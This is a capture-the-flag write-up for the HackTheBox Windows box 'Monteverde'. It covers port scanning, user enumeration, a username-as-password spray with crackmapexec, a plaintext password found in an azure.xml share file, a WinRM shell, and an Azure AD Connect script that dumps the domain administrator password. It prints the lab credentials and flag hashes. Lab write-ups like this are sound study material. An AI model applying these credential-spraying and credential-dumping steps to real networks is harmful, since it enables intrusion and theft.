# Hackthebox - Monteverde

## Summary

Monteverde,a Windows box created by HackTheBox user `egre55`, was an overall medium difficulty box. Initial foothold was finding a cred which was a result of a lazy sysadmin. using that we can find credentials for user in a ```azure.xml``` file. checking the group of that user we see it is in Azure Admin group which mean it can perform DCSync using that we can get administrator credentials and pwned this box.

## Enumeration

### nmap scan
```
### Nmap 7.80 scan initiated Tue June 2 14:11:44 2020 as: nmap -T4 -sC -sV -oN nmap/monteverde 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.21s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings:
|   DNSVersionBindReqTCP:
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-01-11 19:22:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=1/11%Time=5E1A1E53%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 9m22s
| smb2-security-mode:
|   2.02:
|_    Message signing enabled and required
| smb2-time:
|   date: 2020-01-11T19:23:57
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
### Nmap done at Sat Jan 11 14:17:14 2020 -- 1 IP address (1 host up) scanned in 329.68 seconds
```
we see all the ports are `Active Directory` and `SMB` related

running `emum4linux` we get a list of usernames.
```
=============================
|    Users on 10.10.10.172    |
=============================
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)

user:[Guest] rid:[0x1f5]
user:[AAD_987d7f2f57d2] rid:[0x450]
user:[mhope] rid:[0x641]
user:[SABatchJobs] rid:[0xa2a]
user:[svc-ata] rid:[0xa2b]
user:[svc-bexec] rid:[0xa2c]
user:[svc-netapp] rid:[0xa2d]
user:[dgalanos] rid:[0xa35]
user:[roleary] rid:[0xa36]
user:[smorgan] rid:[0xa37]
```
using that we can create a `users.txt` as
```
Guest
AAD_987d7f2f57d2
mhope
SABatchJobs
svc-ata
svc-bexec
svc-netapp
dgalanos
roleary
smorgan
```
` crackmapexec smb 10.10.10.172 -u users.txt -p users.txt`

Trying the same username as password we get a successful credential as `SABatchJobs:SABatchJobs`

Trying that on `winrm` we get `Invalid credential` so lets try on `smb`, and Bingo

we can list and Read lot of shares checking //10.10.10.172/users$ share we see there is a `azure.xml` in `mhope` directory
```
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```
which contain the password as `4n0therD4y@n0th3r$` for `mhope`.

Trying that with [evil-winrm](https://github.com/Hackplayers/evil-winrm) we get a shell as mhope using that we can grab users.txt as `4961976bd7d8f4eeb2ce3705e2f212f2`

## Privilege Escalation

Taking a look to the privileges of this user you can find that it is a member of the group Azure Admins

which means we can do DCSync.

Reading about any exploits for Azure Admin Sync we stumble upon [xpnsec](https://blog.xpnsec.com/about/) [blog](https://blog.xpnsec.com/azuread-connect-for-redteam/)

Performing the attack is as easy as downloading the PS1 [script](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1) and executing that.

```
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

and we have credential for administrator using that we can grab root.txt as `12909612d25c8dcf6e5a07d1a804a0bc`
and we have pwned Monteverde💃💃💃
